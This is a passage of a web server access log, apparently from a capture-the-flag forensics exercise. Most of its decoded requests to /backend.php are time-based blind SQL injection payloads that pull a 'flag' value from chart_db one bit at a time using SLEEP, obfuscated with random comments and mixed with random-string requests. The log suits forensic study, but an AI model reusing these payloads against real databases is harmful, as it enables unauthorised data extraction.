line_no	timestamp	decoded_request
597	01/Mar/2015:13:18:24 -0500	/backend.php?user=admin' AND IF(/*mwYSnzjcnPj*/SUBSTRING(REVERSE(/*KYYvwzc2*/CONV(HEX(SUBSTRING(/*Taxd2*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*XO9RekV2Fln*/),28,1)),16,2))/*HG*/,5,1)=1,SLEEP(2),25359253) AND '964
598	01/Mar/2015:13:18:27 -0500	/backend.php?user=k3pyVIBsEOro6rfWHmg56xLVQ6WrMgcEOJ7PDWbkI359FXA6GiAWe1AuBy0v3
599	01/Mar/2015:13:18:28 -0500	/backend.php?user=8rbIdW1BT7lVNlZsutGdeaIeAKvow0aILAqPU1fq3CPKd2rgDb
600	01/Mar/2015:13:18:26 -0500	/backend.php?user=admin' AND IF(/*h8q*/SUBSTRING(REVERSE(/*nzBL3*/CONV(HEX(SUBSTRING(/*ebTgYnPHkOT*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Kji*/),28,1)),16,2))/*dWEDCCEGuL*/,6,1)=1,SLEEP(2),73534) AND '72937
601	01/Mar/2015:13:18:28 -0500	/backend.php?user=admin' AND IF(/*5EW07DZYUH1*/SUBSTRING(REVERSE(/*A3WvHJR*/CONV(HEX(SUBSTRING(/*PeaYYo*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*v9TQFYUFdXZ*/),28,1)),16,2))/*CXfpwJRk*/,7,1)=1,SLEEP(2),626916) AND '3133887
602	01/Mar/2015:13:18:29 -0500	/backend.php?user=yMuWGWNOQfTHgORgw1APZjE7GxSgKgy2VCFYaIefA51fm4PfM78iq3SpSeshRbrjDVAwBOhQ8oYb10wS5RASEGvKuVjsBCAC57W
603	01/Mar/2015:13:18:30 -0500	/backend.php?user=szluxKESGeWdhsgxNrIKBLYBKgpJNzwgP7ttQGvgcFHMdBXxaVD9i11teBjfgbOkRtC0GzPeKTUPZplEbCrvvK7RwUT2jD6K
604	01/Mar/2015:13:18:28 -0500	/backend.php?user=admin' AND IF(/*4YccPwU*/SUBSTRING(REVERSE(/*G64hWTNsF*/CONV(HEX(SUBSTRING(/*Ia3Cm*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*R7*/),29,1)),16,2))/*WKakW*/,1,1)=1,SLEEP(2),53998345) AND '32428
605	01/Mar/2015:13:18:30 -0500	/backend.php?user=admin' AND IF(/*FEQMmRCZar9*/SUBSTRING(REVERSE(/*mtCZd*/CONV(HEX(SUBSTRING(/*HHWG9ug*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*cJmky7SRk*/),29,1)),16,2))/*Yz1956*/,2,1)=1,SLEEP(2),5499764) AND '544299
606	01/Mar/2015:13:18:30 -0500	/backend.php?user=admin' AND IF(/*kCgHeP*/SUBSTRING(REVERSE(/*yeJDz*/CONV(HEX(SUBSTRING(/*h4A0cqmb*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*8VJjjTNyYQZ*/),29,1)),16,2))/*KQlk*/,3,1)=1,SLEEP(2),85728) AND '55
607	01/Mar/2015:13:18:30 -0500	/backend.php?user=admin' AND IF(/*ECWBBwQLHsg*/SUBSTRING(REVERSE(/*2EpCElJMAok*/CONV(HEX(SUBSTRING(/*v9vC*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*e5*/),29,1)),16,2))/*e02svVms*/,4,1)=1,SLEEP(2),8573) AND '361
608	01/Mar/2015:13:18:31 -0500	/backend.php?user=HyyT75WI3NcXnyPk6W7OOhzWDK1d7LtoxofnEowON9cN131
609	01/Mar/2015:13:18:30 -0500	/backend.php?user=admin' AND IF(/*jeRKWOqitP*/SUBSTRING(REVERSE(/*OUWS2O45n2s*/CONV(HEX(SUBSTRING(/*lOE5PszE*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*NkuHb87t0*/),29,1)),16,2))/*CtDBu7yTD*/,5,1)=1,SLEEP(2),1635843) AND '165374
610	01/Mar/2015:13:18:32 -0500	/backend.php?user=admin' AND IF(/*uVwa*/SUBSTRING(REVERSE(/*mrhIHxi*/CONV(HEX(SUBSTRING(/*2RriQJL1i*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*agG6le47*/),29,1)),16,2))/*jvoxh2*/,6,1)=1,SLEEP(2),119127286) AND '288
611	01/Mar/2015:13:18:33 -0500	/backend.php?user=vpRivrr3Dt
612	01/Mar/2015:13:18:34 -0500	/backend.php?user=scEfdxf3FtppvIgAEY0yEZWWcSMLUmPoqlQLPbOs14nxpA2aWJPb674Sp9mX739O23DokGqhBopyiE7iCiTZ3ss9vfvw
613	01/Mar/2015:13:18:32 -0500	/backend.php?user=admin' AND IF(/*ds2kNkbJ2T*/SUBSTRING(REVERSE(/*o6*/CONV(HEX(SUBSTRING(/*TUyjd1XQU*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*0VcEB9TGo0C*/),29,1)),16,2))/*bQ1qeV*/,7,1)=1,SLEEP(2),5356287) AND '872913
614	01/Mar/2015:13:18:34 -0500	/backend.php?user=admin' AND IF(/*5QUiVg*/SUBSTRING(REVERSE(/*v3b3*/CONV(HEX(SUBSTRING(/*v9*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*xu8UyQQ*/),30,1)),16,2))/*gS4VFllHcFK*/,1,1)=1,SLEEP(2),11299) AND '2957549
615	01/Mar/2015:13:18:36 -0500	/backend.php?user=RwR4dtloxrr
616	01/Mar/2015:13:18:34 -0500	/backend.php?user=admin' AND IF(/*iyTMd8GKlXn*/SUBSTRING(REVERSE(/*4JA084iMI*/CONV(HEX(SUBSTRING(/*ERl3BIq*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Nz*/),30,1)),16,2))/*qdW*/,2,1)=1,SLEEP(2),3248) AND '92773
617	01/Mar/2015:13:18:36 -0500	/backend.php?user=admin' AND IF(/*UIm*/SUBSTRING(REVERSE(/*3UnhITBH8*/CONV(HEX(SUBSTRING(/*cYt14ymgwsL*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*FfO1RiQXbzo*/),30,1)),16,2))/*A6oVRdpN9zY*/,3,1)=1,SLEEP(2),1895645) AND '258895
618	01/Mar/2015:13:18:38 -0500	/backend.php?user=3kere9bdfTVbi0vykgNT93FZawGESklIyZ4h32MRrm8xxCziHsdig9QJEpJeq5
619	01/Mar/2015:13:18:36 -0500	/backend.php?user=admin' AND IF(/*GyBJ9qQ*/SUBSTRING(REVERSE(/*brDeCo*/CONV(HEX(SUBSTRING(/*tT*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*b9WZmZXF*/),30,1)),16,2))/*G7JGNI9Vckh*/,4,1)=1,SLEEP(2),7346) AND '32
620	01/Mar/2015:13:18:38 -0500	/backend.php?user=admin' AND IF(/*FqKXmJ*/SUBSTRING(REVERSE(/*VtKx0TT1oXR*/CONV(HEX(SUBSTRING(/*mkSX9*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*jlpeJ0pvK*/),30,1)),16,2))/*IgSl6Mjkk*/,5,1)=1,SLEEP(2),8543465) AND '791
621	01/Mar/2015:13:18:39 -0500	/backend.php?user=JBTNAcbgXzRPtf0ngRgBL9
622	01/Mar/2015:13:18:40 -0500	/backend.php?user=3xREdD0FNvQ9xRh7hPLm5MHPaOhFbvKkwQJ
623	01/Mar/2015:13:18:38 -0500	/backend.php?user=admin' AND IF(/*THrs2q5LGo*/SUBSTRING(REVERSE(/*vLas*/CONV(HEX(SUBSTRING(/*wO*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*FvFQlzFJG*/),30,1)),16,2))/*Dy2Jum*/,6,1)=1,SLEEP(2),931227) AND '5146817
624	01/Mar/2015:13:18:42 -0500	/backend.php?user=r2KHJP1AhJIsqat1HlIIL9ts6KWXMkXKmONMysuL9uvkIuGrjyh9VkPZLKF4TtckLUwFezZ1LNOhTzOMqM
625	01/Mar/2015:13:18:40 -0500	/backend.php?user=admin' AND IF(/*w0GoIChuUN*/SUBSTRING(REVERSE(/*uGds0hJXi*/CONV(HEX(SUBSTRING(/*ILqNGV41*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*1nHk*/),30,1)),16,2))/*pd*/,7,1)=1,SLEEP(2),795625) AND '5872994
626	01/Mar/2015:13:18:42 -0500	/backend.php?user=admin' AND IF(/*ZAb6*/SUBSTRING(REVERSE(/*t5pMWv*/CONV(HEX(SUBSTRING(/*ssFYil5z2Rr*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*AbQ1zSXSqZt*/),31,1)),16,2))/*LdIkLjrAlqo*/,1,1)=1,SLEEP(2),953356652) AND '82
627	01/Mar/2015:13:18:42 -0500	/backend.php?user=admin' AND IF(/*JDpGoa*/SUBSTRING(REVERSE(/*ipUGkHP4KR*/CONV(HEX(SUBSTRING(/*2rb8VU2fos*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*aR1lH*/),31,1)),16,2))/*b0j*/,2,1)=1,SLEEP(2),4571533) AND '17
628	01/Mar/2015:13:18:42 -0500	/backend.php?user=admin' AND IF(/*saoK*/SUBSTRING(REVERSE(/*RwI0n*/CONV(HEX(SUBSTRING(/*bn3*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*UtZSF9jjy*/),31,1)),16,2))/*r131WC2*/,3,1)=1,SLEEP(2),4813) AND '872654
629	01/Mar/2015:13:18:43 -0500	/backend.php?user=ttosVdl6208zSmuKK9yNEAjVPXtXTVOIjtFIRu7bROe4RcWtC82WqqHgQTN70Q3hcaXQNcm
630	01/Mar/2015:13:18:42 -0500	/backend.php?user=admin' AND IF(/*270o3tb*/SUBSTRING(REVERSE(/*5862xkuez*/CONV(HEX(SUBSTRING(/*2YBax8*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*PfD1O*/),31,1)),16,2))/*eA1V*/,4,1)=1,SLEEP(2),719533447) AND '873
631	01/Mar/2015:13:18:45 -0500	/backend.php?user=YrG0RtYW6cqu9qAxkpLEFL
632	01/Mar/2015:13:18:44 -0500	/backend.php?user=admin' AND IF(/*eLelLJlHg*/SUBSTRING(REVERSE(/*to*/CONV(HEX(SUBSTRING(/*gXCb*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Xo*/),31,1)),16,2))/*4PXS9eHgU*/,5,1)=1,SLEEP(2),34388) AND '754126
633	01/Mar/2015:13:18:47 -0500	/backend.php?user=QHPFV884PTz0pkGUfPjKFYo6GslwhkUqxkjc6nqGaAsBI1UUrOvs
634	01/Mar/2015:13:18:46 -0500	/backend.php?user=admin' AND IF(/*1Fv40Mt*/SUBSTRING(REVERSE(/*BL0krnCQ*/CONV(HEX(SUBSTRING(/*ctVEBgcT*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*tyGS*/),31,1)),16,2))/*Q8Ghj1j*/,6,1)=1,SLEEP(2),97175442) AND '765
635	01/Mar/2015:13:18:48 -0500	/backend.php?user=admin' AND IF(/*32p*/SUBSTRING(REVERSE(/*6BTlE0Pon*/CONV(HEX(SUBSTRING(/*NJtv8MnT*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*xS9BPTRO*/),31,1)),16,2))/*zzFQV*/,7,1)=1,SLEEP(2),8969424) AND '642
636	01/Mar/2015:13:18:49 -0500	/backend.php?user=xyIuXmnFsPYN7UNBhypeAw5CcFGOflTgFpubMPwgoRfE2Ecvb
637	01/Mar/2015:13:18:48 -0500	/backend.php?user=admin' AND IF(/*MOhyDu*/SUBSTRING(REVERSE(/*SBvSnotN*/CONV(HEX(SUBSTRING(/*Z2tQF7FFvi*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*hm465AWxC6g*/),32,1)),16,2))/*L3V*/,1,1)=1,SLEEP(2),8964) AND '7952931
638	01/Mar/2015:13:18:51 -0500	/backend.php?user=PJWioe037SwfEfTVwt61wFbwYW8qYcd3EEEzifXxqaoVrhJ2vQutyTJx97hI8MB2vHq7
639	01/Mar/2015:13:18:50 -0500	/backend.php?user=admin' AND IF(/*fyTclRdi1*/SUBSTRING(REVERSE(/*9NeFIUcu*/CONV(HEX(SUBSTRING(/*50qJc6oXWN*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*RY4R3h2x*/),32,1)),16,2))/*oxJFhzaWUp*/,2,1)=1,SLEEP(2),897413) AND '734255
640	01/Mar/2015:13:18:53 -0500	/backend.php?user=yJNadoEY6BKmRU1i5GBdbMxznyI4txtwhjKxyRrZaVMB0PRfVs2p0ysL4YD
641	01/Mar/2015:13:18:54 -0500	/backend.php?user=14SWJHikpAeeuUoFM0F1DwwuRSY8kXDB4bQzxplZ4jkhmzEgtanTmCVOOtC1es7DkMRY
642	01/Mar/2015:13:18:52 -0500	/backend.php?user=admin' AND IF(/*A9*/SUBSTRING(REVERSE(/*fzi*/CONV(HEX(SUBSTRING(/*AmE5*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*by5lQqe1J*/),32,1)),16,2))/*fsnhvHI*/,3,1)=1,SLEEP(2),67253619) AND '6763
643	01/Mar/2015:13:18:54 -0500	/backend.php?user=admin' AND IF(/*HO6i5*/SUBSTRING(REVERSE(/*2r*/CONV(HEX(SUBSTRING(/*9JFzF*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*1Sq*/),32,1)),16,2))/*vV7CObo9W*/,4,1)=1,SLEEP(2),784568462) AND '46932
644	01/Mar/2015:13:18:56 -0500	/backend.php?user=yE3UmHuLhYv9qfXM3Ew6ReXXGXd4rMCVBEXgCWNeLss0O2O17D4iynlRZ
645	01/Mar/2015:13:18:54 -0500	/backend.php?user=admin' AND IF(/*PE*/SUBSTRING(REVERSE(/*xdw4bHqPuCR*/CONV(HEX(SUBSTRING(/*RH5sAgyKf*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*rxCLwRG*/),32,1)),16,2))/*Y1QPIuTfk*/,5,1)=1,SLEEP(2),17827833) AND '994489
646	01/Mar/2015:13:18:58 -0500	/backend.php?user=fVABqPB5X33nKQmV6zW2kWp5E
647	01/Mar/2015:13:18:57 -0500	/backend.php?user=admin' AND IF(/*jvk1OAce04J*/SUBSTRING(REVERSE(/*hYYhB1Ss3xF*/CONV(HEX(SUBSTRING(/*01Ra*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*bwt9l0Gg1hp*/),32,1)),16,2))/*kUozJcK*/,6,1)=1,SLEEP(2),852235) AND '7641
648	01/Mar/2015:13:18:59 -0500	/backend.php?user=admin' AND IF(/*bUb6L*/SUBSTRING(REVERSE(/*iM9Scrj0*/CONV(HEX(SUBSTRING(/*5vpk*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*CHPYARQDw*/),32,1)),16,2))/*O9i*/,7,1)=1,SLEEP(2),33175342) AND '88
649	01/Mar/2015:13:18:59 -0500	/backend.php?user=admin' AND IF(/*eu*/SUBSTRING(REVERSE(/*k2WKqc*/CONV(HEX(SUBSTRING(/*BEz*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*GRqkK2Zq*/),33,1)),16,2))/*b2bLvgCrY4x*/,1,1)=1,SLEEP(2),484243) AND '22377
650	01/Mar/2015:13:18:59 -0500	/backend.php?user=admin' AND IF(/*tWLjb1cJJM*/SUBSTRING(REVERSE(/*WlRbAp72apq*/CONV(HEX(SUBSTRING(/*Aa2v*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*tAHwr9A*/),33,1)),16,2))/*RX5FXUmH*/,2,1)=1,SLEEP(2),3256) AND '1731895
651	01/Mar/2015:13:18:59 -0500	/backend.php?user=DntxnqAWtGX
652	01/Mar/2015:13:19:00 -0500	/backend.php?user=TVwPTqaCBRO8KtxMWz4SYOM19SFY2NfegSLyIt1D5g2k
653	01/Mar/2015:13:18:59 -0500	/backend.php?user=admin' AND IF(/*EvDd*/SUBSTRING(REVERSE(/*rKKV*/CONV(HEX(SUBSTRING(/*cEJrj5*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*s3Klas*/),33,1)),16,2))/*RcL16*/,3,1)=1,SLEEP(2),94122766) AND '86773
654	01/Mar/2015:13:19:01 -0500	/backend.php?user=admin' AND IF(/*cDDeMP*/SUBSTRING(REVERSE(/*376B4S*/CONV(HEX(SUBSTRING(/*ljMpDle*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*jBF0nBiHN7h*/),33,1)),16,2))/*PultVN4s7*/,4,1)=1,SLEEP(2),685255) AND '756
655	01/Mar/2015:13:19:02 -0500	/backend.php?user=uZYaSk9CT72wkDa1
656	01/Mar/2015:13:19:01 -0500	/backend.php?user=admin' AND IF(/*Kn*/SUBSTRING(REVERSE(/*BEfDIKk*/CONV(HEX(SUBSTRING(/*T7JveAa6*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*NXpmKRB5A*/),33,1)),16,2))/*Pfr3YQqX9s*/,5,1)=1,SLEEP(2),51957884) AND '41
657	01/Mar/2015:13:19:04 -0500	/backend.php?user=Ag0h5mSp0Rhd8tkyJW4DIEIy66YOknlIqQNxj57eC6mbzFFxZ5Gh1Di3QL
658	01/Mar/2015:13:19:03 -0500	/backend.php?user=admin' AND IF(/*NhkuWypx*/SUBSTRING(REVERSE(/*2Tj1QfoI5*/CONV(HEX(SUBSTRING(/*UxtZy4f*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*M9*/),33,1)),16,2))/*iIQ*/,6,1)=1,SLEEP(2),659728283) AND '6271175
659	01/Mar/2015:13:19:05 -0500	/backend.php?user=admin' AND IF(/*hzVTU*/SUBSTRING(REVERSE(/*IVcGvi6*/CONV(HEX(SUBSTRING(/*5KlQOghoNV*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*v8VwgM*/),33,1)),16,2))/*il*/,7,1)=1,SLEEP(2),4353338) AND '343
660	01/Mar/2015:13:19:05 -0500	/backend.php?user=admin' AND IF(/*3x*/SUBSTRING(REVERSE(/*4L8bt7*/CONV(HEX(SUBSTRING(/*WIDaSdPh7*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*yJFr1Okoaha*/),34,1)),16,2))/*xVHY*/,1,1)=1,SLEEP(2),4249) AND '585
661	01/Mar/2015:13:19:05 -0500	/backend.php?user=admin' AND IF(/*K7nNEdE*/SUBSTRING(REVERSE(/*nz8t*/CONV(HEX(SUBSTRING(/*dQ*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*ORQro9F*/),34,1)),16,2))/*dH5cAbx4*/,2,1)=1,SLEEP(2),3216154) AND '495448
662	01/Mar/2015:13:19:05 -0500	/backend.php?user=admin' AND IF(/*I20dwyHH*/SUBSTRING(REVERSE(/*TdsG*/CONV(HEX(SUBSTRING(/*GyPjo3IHpww*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*fstCeAwW*/),34,1)),16,2))/*HzFks*/,3,1)=1,SLEEP(2),7891) AND '9841
663	01/Mar/2015:13:19:06 -0500	/backend.php?user=mQn5DVwMfYaBIZlvcVNN5H1f07JnFTNUzUNPkMQEmmvXi1MGzk8YCyig7GaU8nl2Ktd
664	01/Mar/2015:13:19:05 -0500	/backend.php?user=admin' AND IF(/*23VIsE*/SUBSTRING(REVERSE(/*wLBJs*/CONV(HEX(SUBSTRING(/*uaWv1wu*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*jRFDm*/),34,1)),16,2))/*t88dqtrw*/,4,1)=1,SLEEP(2),6854) AND '4859
665	01/Mar/2015:13:19:08 -0500	/backend.php?user=sTQzb8nN9FkP8vOwRBrnqI2qMD9k2rljc5rcYNZ6Qc4Zc1bdiAb8N9
666	01/Mar/2015:13:19:07 -0500	/backend.php?user=admin' AND IF(/*bamz4*/SUBSTRING(REVERSE(/*X6U*/CONV(HEX(SUBSTRING(/*fOgod1acC*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*QSKq*/),34,1)),16,2))/*8Cm4DMD*/,5,1)=1,SLEEP(2),6143) AND '25196
667	01/Mar/2015:13:19:10 -0500	/backend.php?user=Wyb4yhzI1kYde427l6U5PoVSQqKY1qrs6IUkhVoeNKBzZhVEjA3JNN
668	01/Mar/2015:13:19:09 -0500	/backend.php?user=admin' AND IF(/*s9di*/SUBSTRING(REVERSE(/*EUzr2HE*/CONV(HEX(SUBSTRING(/*nI*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*XW*/),34,1)),16,2))/*LXvM*/,6,1)=1,SLEEP(2),61275) AND '4264871
669	01/Mar/2015:13:19:11 -0500	/backend.php?user=admin' AND IF(/*jYkdSVPSwj*/SUBSTRING(REVERSE(/*vh4197pKd*/CONV(HEX(SUBSTRING(/*NaidX*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*IS20lnL*/),34,1)),16,2))/*CVak*/,7,1)=1,SLEEP(2),9548) AND '4282121
670	01/Mar/2015:13:19:11 -0500	/backend.php?user=admin' AND IF(/*wc83N0kW*/SUBSTRING(REVERSE(/*PEWgNaA6W8*/CONV(HEX(SUBSTRING(/*9M*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*nydZVF*/),35,1)),16,2))/*QkFhY*/,1,1)=1,SLEEP(2),15555887) AND '51
671	01/Mar/2015:13:19:11 -0500	/backend.php?user=admin' AND IF(/*QcZyKsO4hS*/SUBSTRING(REVERSE(/*ZiKXSmero*/CONV(HEX(SUBSTRING(/*8Hx1*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*ZKTt4*/),35,1)),16,2))/*cu0mWAa*/,2,1)=1,SLEEP(2),28771) AND '6572198
672	01/Mar/2015:13:19:11 -0500	/backend.php?user=admin' AND IF(/*1cUhKopno*/SUBSTRING(REVERSE(/*S7s*/CONV(HEX(SUBSTRING(/*3AEJ4cL*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*npwpm6*/),35,1)),16,2))/*QMDgueH*/,3,1)=1,SLEEP(2),898617724) AND '731292
673	01/Mar/2015:13:19:11 -0500	/backend.php?user=admin' AND IF(/*tllm5e*/SUBSTRING(REVERSE(/*ru1Yo*/CONV(HEX(SUBSTRING(/*y04O0f61S*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*wYSXc7tA4um*/),35,1)),16,2))/*trqdUrB*/,4,1)=1,SLEEP(2),49292236) AND '6966
674	01/Mar/2015:13:19:12 -0500	/backend.php?user=7CWJMYC3hBpNG4FZt
675	01/Mar/2015:13:19:11 -0500	/backend.php?user=admin' AND IF(/*vb*/SUBSTRING(REVERSE(/*KY*/CONV(HEX(SUBSTRING(/*67*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*JOf2jjB*/),35,1)),16,2))/*B7T1*/,5,1)=1,SLEEP(2),7263) AND '4592
676	01/Mar/2015:13:19:14 -0500	/backend.php?user=1r50DpWbD2CrXKoo5VWBFXDdmixq6w7pPUsq5qh7w9L5X1A4Ynge6sUO6fdzgam8
677	01/Mar/2015:13:19:13 -0500	/backend.php?user=admin' AND IF(/*m193sm3RrBM*/SUBSTRING(REVERSE(/*nj44d*/CONV(HEX(SUBSTRING(/*q0fK4GhIYfS*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*qWQk9*/),35,1)),16,2))/*L4*/,6,1)=1,SLEEP(2),21582) AND '478232
678	01/Mar/2015:13:19:15 -0500	/backend.php?user=admin' AND IF(/*hnZ*/SUBSTRING(REVERSE(/*eqEBPLRiho*/CONV(HEX(SUBSTRING(/*5VmrC4I*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*hEogpSHeGj*/),35,1)),16,2))/*ujL7I5MATzE*/,7,1)=1,SLEEP(2),73836789) AND '6949
679	01/Mar/2015:13:19:16 -0500	/backend.php?user=KS4xcBRRMDPPVJkdf9u1bxS12BQi7xozPAHAPE7BpUP2gSEZDq8XW5CnWKFUD6VjNImgXvQ6LintUPHGdHiKYMCqRemW
680	01/Mar/2015:13:19:15 -0500	/backend.php?user=admin' AND IF(/*ltY1agq*/SUBSTRING(REVERSE(/*0OZ*/CONV(HEX(SUBSTRING(/*Qw4QoSSJ7CS*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Cc1IYEo*/),36,1)),16,2))/*ol9JkDFFnO*/,1,1)=1,SLEEP(2),33961) AND '28
681	01/Mar/2015:13:19:17 -0500	/backend.php?user=bTBq6A9iSP3e71i9Y1yb0A1S4Tnni2EP7ig0VoG3DTKsdM9PGgVcEHeA5iU6UCoCRdEVrJlpc45ABTPHogQD7CbI
682	01/Mar/2015:13:19:17 -0500	/backend.php?user=admin' AND IF(/*iu*/SUBSTRING(REVERSE(/*dOw4p*/CONV(HEX(SUBSTRING(/*iFW6vXNY0*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*rrYmVt*/),36,1)),16,2))/*sYB6Esb*/,2,1)=1,SLEEP(2),5931) AND '86415
683	01/Mar/2015:13:19:19 -0500	/backend.php?user=77gBy57o2gUG5YfNvcm
684	01/Mar/2015:13:19:20 -0500	/backend.php?user=ukQdNP7rvw8W7eQsoyb8NBdHRN7iesB
685	01/Mar/2015:13:19:19 -0500	/backend.php?user=admin' AND IF(/*GV*/SUBSTRING(REVERSE(/*jUq2faAZ9*/CONV(HEX(SUBSTRING(/*4a6IS*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*C5*/),36,1)),16,2))/*5v5FR7Y*/,3,1)=1,SLEEP(2),75522949) AND '3943755
686	01/Mar/2015:13:19:22 -0500	/backend.php?user=ukPzaUaHesmS8eIkpJIknNxSA79EsYbKIf55cTXxKBF4wwryGTrtrEax4RD0Cz8fwcPIfAFKvIWXlr
687	01/Mar/2015:13:19:21 -0500	/backend.php?user=admin' AND IF(/*9oFR8QNu*/SUBSTRING(REVERSE(/*orbusAMM*/CONV(HEX(SUBSTRING(/*aEXqaC*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*zEQlI9e*/),36,1)),16,2))/*ZkF3TspjFoO*/,4,1)=1,SLEEP(2),365521) AND '9676818
688	01/Mar/2015:13:19:23 -0500	/backend.php?user=admin' AND IF(/*cH*/SUBSTRING(REVERSE(/*VZu*/CONV(HEX(SUBSTRING(/*BZ2*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*KXSw2JX*/),36,1)),16,2))/*M34dDsCDK*/,5,1)=1,SLEEP(2),639788) AND '47227
689	01/Mar/2015:13:19:24 -0500	/backend.php?user=9T1uPa572r7zGS5WFx6BcyszPRWVvBFn0pl
690	01/Mar/2015:13:19:23 -0500	/backend.php?user=admin' AND IF(/*Rih2S6YdT*/SUBSTRING(REVERSE(/*Doaaq*/CONV(HEX(SUBSTRING(/*3HMqjC*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*OzQ*/),36,1)),16,2))/*LD5TqSEt*/,6,1)=1,SLEEP(2),3319) AND '1794647
691	01/Mar/2015:13:19:26 -0500	/backend.php?user=UqOqR7O4CS5cCKzXC77fngsAKas
